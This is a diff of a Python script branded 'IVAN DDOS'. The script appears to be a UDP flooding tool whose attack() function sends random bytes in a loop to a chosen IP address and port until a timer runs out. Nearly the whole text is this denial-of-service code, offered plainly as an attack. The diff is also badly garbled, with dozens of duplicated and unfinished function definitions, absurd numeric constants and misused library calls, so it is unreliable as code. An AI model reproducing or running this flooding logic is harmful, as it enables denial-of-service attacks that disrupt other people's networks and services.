-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2505,7 +1842,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2680,7 +2043,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2712,7 +2075,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2744,7 +2107,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2776,7 +2139,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2802,7 +2165,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2834,7 +2197,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2866,7 +2229,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2898,7 +2261,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3064,7 +2427,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3090,33 +2453,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3142,7 +2479,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3317,7 +2680,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3349,7 +2712,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3381,7 +2744,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3413,7 +2776,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3439,7 +2802,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3471,7 +2834,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3503,7 +2866,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3535,7 +2898,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3701,7 +3064,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3727,33 +3090,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3779,7 +3116,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3954,7 +3317,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -3986,7 +3349,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4018,7 +3381,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4050,7 +3413,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4076,7 +3439,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4108,7 +3471,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4140,7 +3503,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4172,7 +3535,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4338,7 +3701,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4364,33 +3727,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4416,7 +3753,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4591,7 +3954,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4623,7 +3986,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4655,7 +4018,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4687,7 +4050,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4713,7 +4076,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4745,7 +4108,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4777,7 +4140,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4809,7 +4172,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -4975,7 +4338,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -5001,33 +4364,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -5053,7 +4390,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -5228,7 +4591,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -5260,7 +4623,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -5292,7 +4655,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -5324,7 +4687,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -5350,7 +4713,644 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
